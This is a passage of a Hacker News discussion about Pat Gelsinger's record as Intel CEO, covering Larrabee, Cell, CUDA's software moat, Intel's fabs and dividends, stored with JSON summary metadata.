gamers and maybe some commercial linear algebra applications. reply dismalaf 12 hours agorootparentprev> You certainly couldn’t know AI was coming. ?? People have been buying GPUs since the late 90's, it was always an obvious growth vector. And forget AI, we were using GPUs to run statistical programs since the late 00's... reply AlotOfReading 12 hours agorootparentI remember having this argument 10+ years ago. Discrete GPUs like what gamers were buying were thought to be a small market with no real routes to bigger markets. Workstation and HPC could be addressed with entirely separate product lines, hence the disaster that was larrabee. It was Nvidia that pushed the unified workstation/consumer architecture. ATI reused core architecture, but they had very different software stacks above with their firestream stuff. reply Const-me 12 hours agorootparentprev> the nonsense of Larrabee/making it out of x86 It only seems nonsense in retrospect. No one expected nVidia to improve flops/dollar in their GPUs that quickly. And Larrabee wasn’t the only architecture deprecated by GPGPUs, Cell Broadband Engine by Sony+Toshiba+IBM was another one. reply pjmlp 11 hours agorootparentCell required Assembly programming Demoscene skill level to make good use of them, there was a C sdk, but really you wanted to write Assembly, and relatively tricky Assembly at it. It is one of the reasons why Playstation 3 is the less celebrated one, and the console generation where XBox was able to pull ahead. Larrabee, I was at a GDCE 2009 session where it was demoed, and while the idea was promising, it didn't seem to actually pull off in practice, plus there was hardly much hardware where we could actually try it out ourselves. Xeon Phi didn't made it better regarding adoption, nor did AVX. reply touisteur 1 hour agorootparentAnother way to see this is NVIDIA invested heavily, heavily in making a language and its compiler useable (for some level of useable.......) on enthusiast-affordable and poor-scrappy-researcher-affordable hardware on a complex weird-to-program-from-asm architecture and provided good-enough performance (and showcasing lots of very good optimizations) on standard HPC libraries and a bit of HW/SW co-design and kept at it for a long long time... with some level of backwards compatibility too. The recipe is here. reply actionfromafar 5 hours agorootparentprevLarrabee (or something similar) could have been an amazing real-time operating system target. Each little (Pentium!) core having truly its own local memory, no contention. But it was pitched as a GPU and the raw performance was not there. Intel sucks at software and should have leaned in to their strengths - documenting the hell out of the low level workings of Larrabee. Workloads tuned to it would have been a great moat. reply kuschku 7 hours agorootparentprev> Cell required Assembly programming Demoscene skill level to make good use of them, there was a C sdk, but really you wanted to write Assembly, and relatively tricky Assembly at it. > It is one of the reasons why Playstation 3 is the less celebrated one, and the console generation where XBox was able to pull ahead. In retrospect, Cell was a great architecture. In typical Sony fashion it was simply a few years too early. At the time games were single-threaded and many console games still expected CPU and GPU to be in sync. On the PS2, the difference between using the vector accelerator or not was 1.4x – many developers never bothered. But on the PS3 this was simply not an option, as the performance difference was 6x (!). The big issue at the time was dev tooling. Most existing engines had no support for dispatching jobs or any form of pipelining. Adding that required redesigning the engine from the ground up. On top of that the dispatcher/manager and the jobs use two different µarchs. Obviously, game and engine developers at the time hated cell with a passion.[1] But even on the PC and Xbox, frequency scaling ended with the Pentium 4. Multi-core CPUs became mainstream. As CPUs stalled, most of the performance increase on PCs came from GPUs, that had moved from a fixed-function pipeline to shaders. Slowly, even PC games had to do the bulk of their work in jobs dispatched across multiple cores. Engines that had adapted to Cell got a massive head start. Today, the very textbook for game development – \"Game Engine Architecture\", written by Jason Gregory – uses the architecture of the Uncharted games on PS3 as the prime example for how to build a modern engine. As result, nowadays even small indie games are built that way.[2] ________________________ 1. Gabe Newell: \"Investing in the Cell, investing in the SPE gives you no long-term benefits. There's nothing there that you're going to apply to anything else\" https://www.wired.com/2007/10/valves-gabe-new/ 2. e.g., Tiny Glade: https://www.youtube.com/watch?v=jusWW2pPnA0. reply pjmlp 6 hours agorootparentYes, in that regard it was ahead of its time, and nowadays many game developers are exploring the possiblities to get rid of everything and explore pure compute for a full software rendering stack, running on GPGPU, agnostic from the actual rendering API. Although I think it would still be better to use specific shading languages as the hardware isn't the same architecture, thus there is only so much one can do with traditional languages without extensions, or GPGPU specific algorithms/data structures, but that is me as outsider with interest in the field. The experts seem to be enjoying exploring CUDA, SYCL, MSL, and similar for such purposes. reply twoodfin 6 hours agorootparentThat sounds fascinating… any pointers here? reply Const-me 41 minutes agorootparentAbout rendering triangle meshes with compute shaders, here’s a long technical video how UE5 does that: https://www.youtube.com/watch?v=TMorJX3Nj6U&t=3488s reply pjmlp 4 hours agorootparentprevFor example OTOY uses CUDA renderering. https://home.otoy.com/render/octane-render/ If you prefer actual code, https://advances.realtimerendering.com/s2015/aaltonenhaar_si... and \"Mesh Shaders - The Future of Rendering\" https://www.youtube.com/watch?v=3EMdMD1PsgY \"GPU driven Rendering with Mesh Shaders in Alan Wake 2\" https://www.youtube.com/watch?v=EtX7WnFhxtQ reply Const-me 5 hours agorootparentprev> required Assembly programming Demoscene skill level to make good use of them Yeah, but writing efficient CUDA kernels, or D3D compute shaders, is not particularly straightforward either. At least GPU cores have direct access to global memory but still, for good throughput that memory access needs to be coalesced. Then there’re manually managed groupshared memory, atomics, wave/warp intrinsics in D3D12/CUDA, and now these special low-precision matrix multiplication instructions for AI. People accepted all that complexity because performance is too good to ignore, both flops/dollar and flops/watt. Contemporary mainstream GPUs were just better than SPEs on Cell, or AVX-512 on Xeon Phis. Specifically, PS3 (2006) delivered up to 200 GFlops FP32, first-generation Xeon Phi (incredibly expensive devices released in 2010) 750 GFlops, but GeForce 460 (released in 2010 for the price of $200) delivered up to 900 GFlops. reply pjmlp 4 hours agorootparentTrue, but it is much easier than Demoscene Assembly skill level. reply markhahn 13 hours agorootparentprevIntel did a good job on iGPUs, which satisfy most customers (even back in the i915 days). But in retrospect, of course it was a missed market. It's hard to disentagle that choice from others in the same era (including the refusal to jump onto EUV or chiplets). reply ghaff 1 hour agorootparentA lot of the technology behind EUV is just insane, but it's not like ASML has done so great financially. CMOS process shrinks have been a pretty impressive unicorn. There are various levers but not clear to me what will happen going forward. reply omcnoe 12 hours agorootparentprevThey did a good job in the sense that they provide the minimum neccessary baseline to run a graphical Windows environment without additional hardware. The attitude that it's a good job because it satisfied most of their current customers is exactly the problem with the whole companies approach to product development. reply wuming2 6 hours agoparentprevWith products just leaving behind the old Apple days and Foundry, in fact, not a 1st tier supplier anymore what is there to salvage do you think? For the latter money was not enough even in, much, better days. reply aurareturn 14 hours agoprevHere are Pat's public failings: * Can't win over AMD, Nvidia, Apple, Broadcom as fab customers * Fab cancellations and delays, wasting a ton of money * Not hiring the right people to steer Intel's internal fab culture to external quick enough * Not simplifying product roadmap. No one knows what the lake code names are. Expect 30% of roadmap to get cancelled. 30% get delayed. 30% switch node tech. Compare this to the simplified AMD roadmap, which is easy to understand and makes sense. * Didn't stop paying dividends until August 2024 * He cut fab funding to pay dividends in 2022 [0] * Didn't see that Intel was swimming naked during the covid boom and that after the boom, Intel would be in huge trouble due to inferior products * He hired 20% more workers since he joined but 54% less revenue * Intel still has more employees in 2024 than in 2019. Instead of trimming fat, he added more fat. Sure, Intel was on the decline no matter who stepped in as CEO in 2021. However, Pat definitely accelerated the decline and made a mess of things with little progress in any area. Gelsinger was a failure all around and it's time someone with no ties to the original decades-long Intel IDM strategy step into the role. Intel needs an outsider who can come in and objectively see the current situation - not the rosy glorious Intel of the past. [0]https://semianalysis.com/2022/07/29/intel-cuts-fab-buildout-... reply computerdork 12 hours agoparentKind of disagree. Have read on forums that by all accounts, the tech in the 18A process is amazing (Gate-all-around transistors, backside power-delivery, 3d packaging tech...), and that they are on the path to catchup/pass TSMC in terms of chip-fabrication performance/power-expenditure in a year or two. Yeah, this is an amazing achievement for such a large company. But have also ready that to make this profitable is like a 5-8 year plan, not something that is profitable in 3. To me, this is his biggest mistake, he needed to keep the ship sailing at least somewhat smoothly while waiting for this big gamble to pay off. And eventhough I do agree with you that he made a lot of mistakes, still he got the the most important issue right, regaining manufacturing leadership. reply aurareturn 6 hours agorootparentEven if 18A can catch TSMC, which I highly doubt, what does it matter if they don’t have any of the big chip designers like Apple and Nvidia? reply throwaway48476 6 hours agorootparentDepends how similar the PDK is. reply philistine 2 hours agorootparentThat's the only thing? We're talking Apple here. If you can't provide tens of millions of chips per quarter, you're useless to them. TSMC not only has the best fabs, the chips fly out of those fabs at blinding speed. reply newswasboring 7 hours agorootparentprevI would love to see a source for you first paragraph. reply chithanh 8 hours agoparentprev> * Intel still has more employees in 2024 than in 2019. Instead of trimming fat, he added more fat. Intel hiring practices under Gelsinger were really puzzling. Did he think that by hiring thousands of random university graduates there will be the next Gordon Moore among them? It was also discussed on HN: https://news.ycombinator.com/item?id=42300028 I can kind of understand the extensive poaching of TSMC engineers in Arizona. Though making TSMC upset is playing with fire as much of Intel's business now depends on them. reply roenxi 16 hours agoprevThis isn't a space I pretend to understand in detail, but Cantrill's objections to Larrabee here seem confusing. With hindsight, Intel abandoning Larrabee has been a disaster and they should have sustained the effort to develop a great GPGPU chip. Without taking any position at all on Gelsinger's execution his strategic vision seems to have be supported by what happened in practice after his attempt. If Intel had been practising making discrete GPU from 2009 to 2024 instead of giving up then it does seem quite reasonable that Nvidia would be a quarter of its size. One of the obvious mis-steps Intel made over the last 20 years was failing to keep trying Larrabee-style chips until they figured out how to make them work. Ok version 1 might be a disaster and version 2 might be bad. But we're looking back over almost 20 years! There was a lot of room to figure out how to be good and tap in to the huge new market that was opening up. reply ekeane 16 hours agoparentIntel has a habit of coming up with great ideas, then deciding that they aren't immediately successful or immediately 60+% gross margins, so it clearly isn't worth following up. Intel's R&D department is a grave yard of great products murdered at the alter of Gross Margin. Larrabee is one such product. It wasn't immediately great, and didn't immediately promise great returns, and didn't quite have a market yet, so it was killed. I can't imagine where Intel would be in the AI world if they had the foresight to stick with Larrabee. reply brookst 15 hours agorootparentYep. Intel has no patience. They have high margin businesses throwing off lots of cash, so the finance-driven culture says “why waste money on risky new things that can’t possibly equal that level of profitability in the short term?” Somehow they forgot that all of their highly profitably businesses were risky bets at one time. reply josephg 11 hours agorootparentRight. Google has the same problem. Any time they create a new product, it’s a coin flip on whether or not it’ll still be around in a year or two. I’ve steered multiple companies away from Google’s offerings because I just don’t think you should trust that any of their newer products will still be around in 5-10 years. Good on them for sticking with their promises for firebase. But it’s a pity about stadia. Don’t bet your business on a flip of the Google coin. reply bjornsing 7 hours agorootparentprev> Somehow they forgot that all of their highly profitably businesses were risky bets at one time. And that all of their highly profitable businesses are risky bets long term. reply bcantrill 15 hours agoparentprevTo be clear, I think that they should have kept iterating on Larrabee (though I would have liked to see it with an open software architecture). With respect to Larrabee, my shock was that Gelsinger had such confidence that iterating on Larrabee would have resulted in an NVIDIA of one-quarter its current size (or one-quarter the size when he recorded the interview in 2019). That's the bit that's bonkers to me: yes, they should have kept iterating (though some acknowledgement from Gelsinger that the first iteration was plagued with problems, not all of them technical[0]) -- but success was emphatically not assured just because it was Intel. [0] https://brightsideofnews.com/blog/an-inconvenient-truth-inte... reply MBCook 15 hours agorootparentIf they had kept going, and really got it working, their fab advantage might have let them really go after Nvidia. In an absolute best case scenario, he may be right. But that seems incredibly unlikely. Still, they should’ve had a much MUCH better GPU story than they did. reply nemothekid 14 hours agorootparent>their fab advantage might have let them really go after Nvidia. I think Cantrill spelled it out in the article, and I think people are overlooking (and for some reason really continue to overlook, or just have no idea) that nvidia's advantage is Software. I remember Larabee as a teenager - I just graduated high school, the forums were talking about it, and I had finally saved enough money to buy an 8800GTX. The 8800GTX was also coincidentally, the first consumer GPU to support CUDA. Almost 2 decades later and it feels like nvidia has an insurmountable moat in AI due to CUDA. This wasn't an accident, nvidia spent a ton of time, with developers, getting it right. FTA: >that NVIDIA had an indisputable lead, even in 2009; that for Intel to dominate NVIDIA it would have required conjuring software expertise and focus with which Intel has famously struggled Ignoring this piece is huge in claming that nvidia would be a quarter of the size. Can you even imagine Intel investing in a non-x86 developer platform for 15 years while they were in the lead? reply MBCook 14 hours agorootparentNot the Intel we have. But if the graphics card stuff had really started to show promise, maybe they would have become an Intel that would. You’re dead right that Nvidia is where they are because of their software story and all the work they put into it. I don’t know if Intel could have learned that lesson. reply baq 13 hours agorootparent> I don’t know if Intel could have learned that lesson. Intel invented this model with x86. reply therealcamino 2 hours agorootparentReally? It doesn't seem to me like much Intel-written software has been key to x86's success. The things I can remember from Intel are compilers, performance analysis tools, and threading and math libraries. But none of them were must-haves, or differentiated x86 chips from competing CPU architectures. Most of the software that made x86 successful came from third parties. And more recently, the reviews I read of the Archmage graphics drivers didn't make it sound like Intel had understood the importance of the software that was essential to a pretty big hardware release. reply markhahn 13 hours agorootparentprevnot sure why people give so much credit to Cuda, at least now. AI hasn't cared about Cuda for years - sure, Torch on NV will use it, but AI is all about Torch/TF, not details below that. reply hnaccount_rng 11 hours agorootparentBecause Torch only exists on CUDA-platforms. At least in any useful form. This was, if anything, the main theme at Supercomputing: “there is not even a point in talking about Nvidia’s new benchmarks. You all are going to buy it anyways” coupled with very few “we are betting on buying cheap hardware (Intel/AMD GPUs) and hope that we can build the relevant parts of CUDA ourselves” and the latter is pretty much a desperation move of labs/sites that simply cannot get NVIDIA GPUs (either price or availability). And yes that is probably the seed of the end of Nvidia’s dominance. But it will take 20 years and multiple fuck ups. Just as it did with Intel reply MBCook 4 hours agorootparentprevMaybe not now (I’m not in a position to know), but wasn’t it a HUGE factor in them becoming the player they are in non-graphics stuff? Because they had great APIs/libraries/documentation to play in that space? reply rhaps0dy 12 hours agorootparentprevWhat? This is really wrong. The name of the game these days is optimizing memory and FLOPs usage on these GPUs. For example, Hopper (H100) cards introduced the WGMMA (Warp-group Matrix-Multiply Accumulate) instruction, and anyone who does LLM training jumped to use it ASAP because without it you can't fully utilize the FLOPs. Anyone training AIs at the cutting age cares a lot about CUDA details. https://hazyresearch.stanford.edu/blog/2024-05-12-tk reply hnaccount_rng 11 hours agorootparentThat’s not what OP meant though. That’s caring about _hardware_ capability. You could do that yourself for different hardware. And (OP’s point) any alternative hardware provider could do that for you. It just happens to be really, really hard reply rhaps0dy 24 minutes agorootparentI think \"AI is all about Torch/TF, not details below that\" directly contradicts the fact that ML people very much care about the details, to squeeze performance out of the hardware. reply boulos 1 hour agoparentprevIt was 15 years ago today that it was cancelled (https://web.archive.org/web/20100106162815/http://news.cnet....). You need to remember that was during the financial crisis, and the first chips were going to be laughably bad and uncompetitive. From the quote in that article: > Justin Rattner (Intel Senior Fellow) demonstrated Larrabee hitting one teraflop, which is great but you could walk across the street and buy an ATI graphics board for a few hundred dollars that would do five teraflops. Intel had no chance for v0 to do anything but lose money. They were way off track, and spent most of the time trying to get to a software rasterizer plus hardware that could work for some games. They did pivot Larrabee into the various Knight chips (Knights Corner, Landing and whatever else) since the \"it's just x86\" was a pretty compelling story in the 2009 era. But ultimately, HPC wasn't that great a market in the early 2010s for accelerators yet and NVIDIA ended up totally eating their lunch over time. I think Intel could have stuck with the HPC market and gotten lucky once ML exploded, but realistically until about 5 years ago there wasn't that much ML spending yet either. 10 years of last place discrete GPU work would have been difficult to invest in. tl;dr: the business case for Larrabee hinged on having a successful gaming business and it wasn't even close. reply wmf 16 hours agoparentprevWhat if they kept trying on Larrabee and it never worked? reply lowbloodsugar 15 hours agorootparentWhich was a reasonable possibility. Larabee was a daft idea. It was never going to work, let alone at consumer prices and power. reply Brian_K_White 15 hours agorootparentprevWhat if aliens came and made everything obsolete? In an infinite universe, anything can happen, and so \"it might not work\" is is always true for everything. No matter what you do, it might not work, and some of the most important and valuable things ever aren't attainable without a lot of investment before you can start to reap any return. Not all ideas are good ideas, so of course there are reasons not to do some things, or to abandon something you started, but merely \"what if it never works\" is not one. Asking that is about equal to asking what if a piano falls on you tomorrow. Sure it could happen, but so what? What does that change? If you don't walk down the street for fear of pianos, you don't get to the grocery store or your job and then you die from starving instead of from a piano. reply arunc 10 hours agoprev> Worse, in his own story, the bad things at Intel always seemed to happen when he wasn’t in the room or otherwise over his objections — and the good things always when he was called in to save an effort from failure. Sounds like spoken by my current boss. During a 1on1, he took up the topic of me apologizing to the team for something I overlooked. He said, in his exact words, \"when things go wrong, a smart leader should blame their team and when things are in their favor they should take credit for that. That's how you grow as a leader in organization, in this corporate ladder. You should learn. Long way to go\". I was like, \"no way he said that!\". I trusted the wrong person and joined this organization! (Sorry about the rant) reply atoav 10 hours agoparentThese words should follow that guy like a curse. reply blitzar 8 hours agorootparentThey should - but they are more likely to be the byeline in their best selling biography charting their meteoric rise to the top. reply chmoore889 16 hours agoprevI feel like I'm seeing a lot about how Gelsinger's decisions were the wrong move for Intel, but I don't see what he direction he should have taken the company instead. What is (or was when Gelsinger became CEO) the move for Intel to get back on top? reply sberens 14 hours agoparentFrom the post: * Signal Intel is in it for the long term, specifically kill the dividend. * Be more customer centric/rebuild customer trust, specifically publicly acknowledge the 10nm slip. Though it seems customer trust in Intel has eroded to the point where only actions will change customers' perception of Intel — I'm not sure what Intel could have communicated to Tofino/Oxide that they hadn't already. reply Pet_Ant 3 hours agorootparentIn the article they say they promised future development on Tofino and then didn't even follow through with their own EOL policy. reply bsder 16 hours agoparentprev> but I don't see what he direction he should have taken the company instead. Software and design support. As pointed out in the article. Intel is genetically incapable of valuing anything other than \"The Fab(tm)\". VLSI designer ... second class citizen. Software ... second class citizen. etc. The ARC graphics card series is an exemplar of the problem. It was always going to be a market disaster. Fine, accept it. However, Intel should have pushed a couple of cards for free to every single HPC/AI grad department in the US. And perhaps even tossed in a $50K grant to boot. That's, what, $50K*100=$5 million max and a thousand graphics cards? Sure, the top 10-20 departments are well-funded and still going to use Nvidia--the rest will chew on your graphics cards. In return you get a legion of grad students developing software for your hardware. And you will quickly get feedback as to what you need to fix for v2. However, you have to value software for that idea to penetrate. And Intel just ... doesn't. reply alephnerd 16 hours agorootparent> However, Intel should have pushed a couple of cards for free to every single HPC/AI grad department in the US. And perhaps even tossed in a $50K grant to boot. That's, what, $50K*100=$5 million max and a thousand graphics cards Nvidia used to do this in the late 2000s and early 2010s. It did wonders to drive CUDA uptake versus Vulkan, and Nvidia would sponsor plenty of researchers and students to leverage CUDA and Nvidia GPUs in Parallel Programming classes. > you have to value software for that idea to penetrate I'm not sure it's software per say and more so Developer Experience. If a vendor fails to truly interact with their implementers, they lose critical feedback. Intel used to have a very active Technical Marketing Engineer org (the old word for DevEx), but I'm not sure how active or relevant it is anymore. reply rincebrain 15 hours agorootparent> not software per [se] and more so Developer Experience This aligns with my experiences trying to use Intel software. The software was often technically very good, but the user experience trying to use it was horrible, and god help you if you got an error. Larrabee all over, really. I suppose linking to [1] and [2] is probably germane for this discussion. I swear there was another blogpost explaining the tradeoffs made in the Larrabee/Xeon Phi development process in exacting detail, and confirming that it ran gaming workloads pretty well before being shelved, but I can't find it again. [1] - https://pharr.org/matt/blog/2018/04/18/ispc-origins [2] - http://tomforsyth1000.github.io/blog.wiki.html#%5B%5BWhy%20d... reply alephnerd 1 hour agorootparentThanks for the links! I absolutely should follow Matt Pharr and Tom Forsyth's blog tbh - I've been out of the HPC world for sometime now but it's getting relevant again. reply physicsguy 10 hours agorootparentprevVulkan didn’t even exist when I got a free card from NVidia. For cross platform programming on GPUs people in academia/industry just gave up because performance was worse, the tooling was terrible and library support was non existent. OpenCL, OpenACC, OpenMP GPU offloading have all been disappointing. reply beebeebeeber 15 hours agorootparentprevNo one wanted to write code for the Knight’s product line. That was the main problem. Followed by p1272,1274,1276 disasters. reply Pet_Ant 3 hours agorootparentHad to look it up, but the magical numbers as the end of the parents quote is the Intel naming of processes. From https://en.wikichip.org/wiki/intel/process#Timeline those are the 14nm, 10nm, and 7nm respectively. reply almostgotcaught 16 hours agorootparentprev> In return you get a legion of grad students developing software for your hardware. That would be worthless. It's so weird that people think academia is contributing in any meaningful way to the top lines or bottom lines here. You're free to look at the commit history of PyTorch/TF/Triton/HF/llama/whatever and judge for yourself. reply physicsguy 10 hours agorootparentThat’s so misguided it’s unreal. I’ve worked at several companies where there have been decent HPC/GPU codebases and at all of them the staff working on that have largely come out of academia in one way or another. reply alephnerd 15 hours agorootparentprev> It's so weird that people think academia is contributing in any meaningful way > PyTorch/TF/Triton/HF/llama/whatever and judge for yourself. Where do you think the creators of most of these current models came from and started their careers? More critically, the ecosystem the arose for these to exist was subsidized by research for decades. reply rhelz 16 hours agoparentprevWell said. Everybody makes mistakes. How many mistakes do you think you have to make in order to build something like Tesla, or SpaceX? Larabee was a mess....anybody who as actually been involved with designing a chip which breaks new ground (and is not just repackaging of somebody else's IP) knows that designing and taping out ANY AND EVERY chip is a big mess. It is not easy to tell heaven from hell on this one--and arguably, Intel's management at the time made the wrong call. Pretty much every decision they were making at the time was the wrong decision, which is why Intel is in the state it is in. When I worked at Intel, Robert Noyce had unfortunately died, but we still had Andy Grove on the business end and Gordon Moore on the technical end. All three of those people are not just good, not even merely great. They were the kind of transcendent geniuses who rewrite the world, and which come along once every 2 or 3 hundred years. Impossible to replace. AFAIAK, If Gelsinger couldn't fix Intel, it was irreparably broken by the time he got there. We should celebrate him for having the courage to try to fix what 4 previous CEOs couldn't fix. I understand that it's painful when one of your suppliers has financial difficulty and has to exit a business you depend on. I feel ya. I hope that nobody will be writing blog posts about the OP's decision to partner with Intel in the first place, pointing to it as one of the fatal mistakes made by the company and their leaders. reply riwsky 15 hours agorootparentIntel never wrote posts of the sort oxide wrote here, that’s the point. reply dangus 15 hours agoparentprevThere's just two things Intel should have been focusing on, and that's getting their fabs back to being competitive with TSMC, and getting their chip designs back to being the best IP in the world. There is no reason why TSMC should be leading Intel on fabrication by so much. Intel has had a crazy amount of time to restructure and refocus when we consider how long their x86 intellectual property lead kept them afloat with their subpar fabrication and delayed manufacturing process updates. They spent many years having faster chips than anyone else despite having subpar fabrication. But now, they can't really escape the fact that ARM is exploding and AMD has the most flexible x86 platform where as each year goes by the number of use cases where Intel is the best choice diminishes. If you play games, the x3D chips are basically the only sensible choice. If you are looking for servers, AMD is consistently 10% cheaper in all the cloud platforms. If you want a mobile system, anything involving ARM and/or TSMC will get you better battery life. The fact that fabless players in the market like AMD and Apple can outpace Intel in so many product lines is, frankly, embarrassing. While I think that other processor design shops selling off fabrication divisions made sense, I think that Intel as a company basically makes no sense if they can't get their fabrication shit together. Because if Intel can't fabricate bleeding edge chips what's the point of using their IP? reply MBCook 15 hours agorootparentI was listening to a discussion about this today, latest Accidental Tech Podcast. The biggest problem Intel has at the moment seems to be they can’t split up and they can’t work together. If you keep both the fab and the design, you have problems. The thing that makes Intel all the money is their CPUs, and because of the state of the fab many of them are made at TSMC. But TSMC isn’t too keen on giving a good deal to someone who wants usurp them. So Intel is paying more per chip than they would if they just spun off the fab. If they did that, they could have higher margins/lower prices. But if you spin off the fab, can they actually get enough business to be able to survive? They’re not on the leading process. They need a massive investment to catch up. Despite their geopolitical importance it seems like they would basically need a real continuing subsidy just to exist, which is effectively being provided by the CPU design side of the business right now right? It’s a real damned if you do damned if you don’t kind of thing. I don’t know what the right thing to do is. Splitting them up kind of seems like the better idea but I don’t know if Intel’s ego could take that. They were the fab company. Their advantage let them survive multiple large mistakes that could’ve killed other companies. Now they’ve all piled up. PS: the CHIPS act money says it goes to Intel. It sounds like if they try to split they may lose it, so would first have to convince the government to let the fab part keep it reply brookst 14 hours agorootparentI much agree with your assessment of the challenge, but I think Intel’s only chance is to capitalize on vertical integration of chip, design, fab. TSMC works closely with big customer (cough Apple), but there are still boundaries there. Intel needs to step back, enjoy the runway the CHIPs act got them, and really think hard about the top to bottom design and fab of an absolutely killer 2027 / 2028 chip would look like. They aren’t as good at design as Apple, and they aren’t as good at fab as TSMC, but they are within striking distance of both and they have that vertical integration opportunity. reply philistine 2 hours agorootparentDo you honestly believe that Intel can outperform every single company making chips? They're the last vertical chip maker. Samsung is still trying, but they're not beating the one-two punch of Apple design, TSMC production that's for sure. reply MBCook 14 hours agorootparentprevWouldn’t that basically require becoming better at fabing than TSMC again? If they can catch up, but not exceeded, then they can’t make a better product than they do right now. I guess it should cut their costs some amount (don’t know how much) which would certainly be a big plus. But without taking the lead again… would that be enough? I suppose if they caught up they could also fab other people‘s chips as Pat wanted to. If they’re tied for best (or at least close) they could probably pick up accounts that TSMC doesn’t have space for or are perhaps too small to help fill out their capacity. While I was listening to the podcast I was thinking about how it almost seems like sort of a historical accident that they’re both design and fabrication. Does anyone else do that at this point? I know it was common early on but maybe it’s just not that sustainable by now. I don’t know. I guess I see splitting the company is more likely to succeed, simply because the design side works and would lose the anchor that it’s tied to. Successfully pulling off a fix while keeping the company intact may be a better outcome if possible though. reply Dalewyn 16 hours agoparentprev>I feel like I'm seeing a lot about how Gelsinger's decisions were the wrong move for Intel The narrative machine for Intel is in full force given how much monies is in play, I wouldn't take anything that seriously. >What is (or was when Gelsinger became CEO) the move for Intel to get back on top? Whatever it takes to drive stonks up up up, obviously. If there was one thing Gelsinger could legitimately be blamed for, it is that he wiped out Intel's market valuation. Nothing else matters, because his \"interim\" replacements are both beancounters whose literal job is to drive stonks up up up. reply tharkun__ 16 hours agorootparentbecause his \"interim\" replacements are both beancounters whose literal job is to drive stonks up up up. That seems like the opposite of what I've heard before and what NVDA have been doing. Is NVDA's stock soaring because the bean counters stifled any innovation before it could happen in order to drive the stonks up? Bean counters can bring stock value up temporarily. The trick is to get out before shit hits the fan. For a comparison, see Boeing. Where shit is hitting the (turbo) fan right now as well. reply YZF 15 hours agorootparent\"Jensen Huang, the 61-year-old co-founder and CEO of Nvidia\" ... There's a hint in there somewhere. How do you get a CEO to believe innovation is the best thing for them and the company? Even if you get them to believe that how do they get their company to innovate? Innovation is hard work. It involves failures. Just buy back your shares and make money. Then someone else comes and eats your lunch. That is how the world works. reply markhahn 13 hours agorootparentprevnvidia's success has nothing to do with bean counters - if nvidia even has them. bean counters are for industries like beans - where the market is stable and the only way to liberate shareholder value is to catch the stray beans. they are exactly the wrong answer when \"disruptive innovation\" is afoot. reply throwaway48476 6 hours agorootparentStagnant industries are stagnant because no participant can conceptualize anything different not because it's not possible. reply Dalewyn 16 hours agorootparentprevThe difference between Nvidia and Intel is that Nvidia still has its founder at its head. A founder interested in seeing his company instead of just stonks go up up up. I have no doubt Nvidia will start losing its way when Huang retires, like almost all other founder-less companies such as Intel. reply dangus 15 hours agorootparentI don't disagree with you that Nvidia has good leadership, and that Intel has bad leadership, but I take a bit of issue with this pedestal that founders are placed on. Being a founder doesn't magically make you the best person for the job of CEO of a company. Huang happens to be a very good leader, but a lot of founders become a drag on their companies later on. It's just an anecdote, I worked for one place where the company truly outgrew the founder's abilities. He was just some guy with an art degree who was at the right place at the right time with his dorm room business idea. I would argue that his lack of ability and experience squandered a lot of the later stage growth opportunities that could have made the company into a billion dollar public corporation. I think about a company like WeWork, that's a company that would not exist today if the founder was not kicked out. Some companies like McDonald's would never have expanded to be a household name if their founders were still in charge. reply Brian_K_White 15 hours agorootparentTheir point wasn't that founders are somehow wiser. The assertion was merely that founders care about the company. Their decisions may be no more prescient than anyone else's, but their decisions are reliably in different directions than anyone else's. Their goal is different, the direction they always aim is different, and that consistent aim has an effect over time regardless what mistakes and misfortunes happen along the way. If you have a specific and clear goal on the horizon and are always aiming for that even though you have to deal with obstacles closer in front of you, over time you still get somewhere. If your goal is just chasing whatever random butterflies float by, you get nowhere. reply martinpw 14 hours agoprevArticles like this are so easy to write after the event. It would be a lot more compelling of an article if it had been published a year ago and had instead predicted what was going to happen given what the author claimed was obvious at the time. Fact is Intel was in a really tough situation and Pat seemed to many (including many here) like the best candidate at the time to be able to turn things around, with the acknowledgement that the situation was dire and there might be nothing anyone could do to save it. reply bcantrill 14 hours agoparentThere are reasons I didn't write this a year ago (perhaps obvious ones?), but yes, it was pretty clear. And in fact, in going back through my own timeline, I found a DM between my co-founder and me on March 23, 2023 in which I predicted that Gelsinger would be fired on November 1, 2024 -- and my co-founder predicted March 1, 2025. reply notthetup 13 hours agorootparentAnd you didn't mention this in the tech predictions episode of 2023 for Oxide and Friends?! You missed a great one! reply CodeHorizon 12 hours agorootparentprevClaiming a prediction after the fact is convenient. It’d be more impressive if these predictions were shared beforehand, Bryan. reply bcantrill 11 hours agorootparentSorry, are you accusing me of lying? I mean, I do have the receipts here... reply trogdor 1 hour agorootparentI don’t think they are accusing you of lying. >It’d be more impressive if these predictions were shared beforehand It’s hard to disagree with that. Based on your comment above, it sound like “the receipts” are messages between you and one other person. Messaging a prediction to a friend is very different than publis",
    "originSummary": [
      "Pat Gelsinger, despite his technical expertise and managerial skills, was deemed unsuitable as Intel's CEO due to his inability to address the company's cultural and strategic challenges.",
      "His leadership decisions, such as maintaining dividends and aggressive advertising, were criticized for reflecting a peacetime approach rather than the necessary wartime leadership.",
      "Gelsinger's management of Intel's Foundry Services and the termination of the Tofino project, a promising programmable switch silicon, were seen as significant missteps, leaving Intel's cultural issues unresolved."
    ],
    "commentSummary": [
      "Pat Gelsinger, CEO of Intel, faced challenges including 10nm production delays and competition from TSMC, leading to significant stock drops despite strategic investments in manufacturing facilities.",
      "Critics suggest that Intel's board, composed mainly of non-technical members, may be a core issue, questioning whether Gelsinger's technical expertise or an outsider is needed to resolve Intel's problems.",
      "The ongoing debate centers on whether Gelsinger's strategies were appropriate or if the board's composition and decisions are hindering Intel's progress."
    ],
    "points": 405,
    "commentCount": 323,
    "retryCount": 0,
    "time": 1733703592
  },
  {
    "id": 42360681,
    "title": "JSON5 – JSON for Humans",
    "originLink": "https://json5.org/",
